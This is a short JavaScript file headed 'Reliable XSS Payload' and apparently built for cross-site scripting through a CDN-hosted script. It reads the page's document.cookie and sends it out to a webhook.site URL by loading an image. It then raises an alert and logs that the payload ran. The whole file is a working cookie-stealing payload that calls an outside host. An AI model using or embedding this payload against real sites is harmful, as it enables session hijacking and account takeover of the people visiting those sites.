// Reliable XSS Payload - Executes Immediately
new Image().src = "https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/from=cdn-js&cookie=" + encodeURIComponent(document.cookie);
alert("🔥 XSS via GitHub CDN!");
console.log("✅ Payload executed after sending to Webhook");
